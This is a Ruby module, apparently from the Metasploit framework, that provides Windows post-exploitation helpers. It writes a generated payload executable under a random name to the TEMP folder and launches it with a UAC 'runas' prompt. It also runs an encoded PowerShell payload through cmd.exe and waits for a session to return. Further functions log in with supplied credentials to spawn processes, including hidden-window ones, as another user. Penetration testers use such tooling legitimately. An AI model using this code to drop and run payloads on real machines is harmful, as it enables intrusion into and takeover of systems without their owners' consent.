# -*- coding: binary -*-

require 'msf/core/exploit/powershell'
require 'msf/core/exploit/exe'

module Msf::Post::Windows::Runas

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::Powershell
  include Msf::Post::Windows::Error

  ERROR = Msf::Post::Windows::Error
  MAX_PATH = 260
  STARTF_USESHOWWINDOW = 0x00000001
  SW_HIDE = 0

  def shell_execute_exe(filename = nil, path = nil)
    exe_payload = generate_payload_exe
    payload_filename = filename || Rex::Text.rand_text_alpha((rand(8) + 6)) + '.exe'
    payload_path = path || get_env('TEMP')
    cmd_location = "#{payload_path}\\#{payload_filename}"
    print_status("Uploading #{payload_filename} - #{exe_payload.length} bytes to the filesystem...")
    write_file(cmd_location, exe_payload)
    command, args = cmd_location, nil
    shell_exec(command, args)
  end

  def shell_execute_psh
    powershell_command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)
    command = 'cmd.exe'
    args = "/c #{powershell_command}"
    shell_exec(command, args)
  end

  def shell_exec(command, args)
    print_status('Executing Command!')
    session.railgun.shell32.ShellExecuteA(nil, 'runas', command, args, nil, 'SW_SHOW')
    ::Timeout.timeout(30) do
      select(nil, nil, nil, 1) until session_created?
    end
  end

  def startup_info
    # this is start info struct for a hidden process last two params are std out and in.
    #for hidden startup_info[12] = STARTF_USESHOWWINDOW and startup_info[13] = 0 = SW_HIDE
    [0, # cb
     0, # lpReserved
     0, # lpDesktop
     0, # lpTitle
     0, # dwX
     0, # dwY
     0, # dwXSize
     0, # dwYSize
     0, # dwXCountChars
     0, # dwYCountChars
     0, # dwFillAttribute
     STARTF_USESHOWWINDOW, # dwFlags
     SW_HIDE, # wShowWindow
     0, # cbReserved2
     0, # lpReserved2
     0, # hStdInput
     0, # hStdOutput
     0  # hStdError
    ].pack('VVVVVVVVVVVVvvVVVV')
  end

  def create_process_with_logon(domain, user, password, application_name, command_line)
    return unless check_user_format(user, domain)
    return unless check_command_length(application_name, command_line, 1024)

    vprint_status("Executing LogonUserW...")
    logon_user = session.railgun.advapi32.LogonUserW(user,
                                                     domain,
                                                     password,
                                                     'LOGON32_LOGON_INTERACTIVE',
                                                     'LOGON32_PROVIDER_DEFAULT',
                                                     4)
    if logon_user['return']
      begin
        ph_token = logon_user['phToken']
        vprint_status("Executing CreateProcessWithLogonW: #{application_name} #{command_line}...")
        create_process = session.railgun.advapi32.CreateProcessWithLogonW(user,
                                                                          domain,
                                                                          password,
                                                                          'LOGON_WITH_PROFILE',
                                                                          application_name,
                                                                          command_line,
                                                                          'CREATE_UNICODE_ENVIRONMENT',
                                                                          nil,
                                                                          nil,
                                                                          startup_info,
                                                                          16)
        if create_process['return']
          pi = parse_process_information(create_process['lpProcessInformation'])
          print_good("Process started successfully, PID: #{pi[:process_id]}")
        else
          print_error("Unable to create process, Error Code: #{create_process['GetLastError']} - #{create_process['ErrorMessage']}")
          print_error("Try setting the DOMAIN or USER in the format: user@domain") if create_process['GetLastError'] == 1783 && domain.nil?
        end

        return pi
      ensure
        session.railgun.kernel32.CloseHandle(ph_token)
      end
    else
      print_error("Unable to login the user, Error Code: #{logon_user['GetLastError']} - #{logon_user['ErrorMessage']}")
    end

    nil
  end

  # Can be used by SYSTEM processes with the SE_INCREASE_QUOTA_NAME and
  # SE_ASSIGNPRIMARYTOKEN_NAME privileges.
  #
  # This will normally error with 0xc000142 on later OS's (Vista+?) for
  # gui apps but is ok for firing off cmd.exe...
  def create_process_as_user(domain, user, password, application_name, command_line)
    return unless check_user_format(user, domain)
    return unless check_command_length(application_name, command_line, 32000)

    vprint_status("Executing LogonUserA...")
    session.sys.config.getenv('SYSTEMDRIVE')
    logon_user = session.railgun.advapi32.LogonUserA(user,
                                                     domain,
                                                     password,
                                                     'LOGON32_LOGON_INTERACTIVE',
                                                     'LOGON32_PROVIDER_DEFAULT',
                                                     4)

    if logon_user['return']
      begin
        ph_token = logon_user['phToken']
        vprint_status("Executing CreateProcessAsUserA...")
        create_process = session.railgun.advapi32.CreateProcessAsUserA(ph_token,
                                                                      application_name,
                                                                      command_line,
                                                                      nil,
                                                                      nil,
                                                                      false,
                                                                      'CREATE_NEW_CONSOLE',
                                                                      nil,
                                                                      nil,
                                                                      startup_info,
                                                                      16)

        if create_process['return']
          begin
            pi = parse_process_information(create_process['lpProcessInformation'])
          ensure
            session.railgun.kernel32.CloseHandle(pi[:process_handle])
            session.railgun.kernel32.CloseHandle(pi[:thread_handle])
          end
          print_good("Process started successfully, PID: #{pi[:process_id]}")
        else
          print_error("Unable to create process, Error Code: #{create_process['GetLastError']} - #{create_process['ErrorMessage']}")
        end

        return pi
      ensure
        session.railgun.kernel32.CloseHandle(ph_token)
      end
    else
      print_error("Unable to login the user, Error Code: #{logon_user['GetLastError']} - #{logon_user['ErrorMessage']}")
    end

    nil
  end

  def parse_process_information(process_information)
    pi = process_information.unpack('LLLL')
    { :process_handle => pi[0], :thread_handle => pi[1], :process_id => pi[2], :thread_id => pi[3] }
  end

  def check_user_format(username, domain)
    if domain && username.include?('@')
      raise ArgumentError, 'Username is in UPN format (user@domain) so the domain parameter must be nil'
    end

    true
  end

  def check_command_length(application_name, command_line, max_length)
    if application_name.nil? && command_line.nil?
      raise ArgumentError, 'Both application_name and command_line are nil'
    elsif application_name.nil? && command_line && command_line.length > MAX_PATH
      raise ArgumentError, "When application_name is nil the command line must be less than MAX_PATH #{MAX_PATH} characters (Currently #{command_line.length})"
    elsif application_name && command_line && command_line.length > max_length
      raise ArgumentError, "When application_name is set, command line must be less than #{max_length} characters (Currently #{command_line.length})"
    end

    true
  end
end
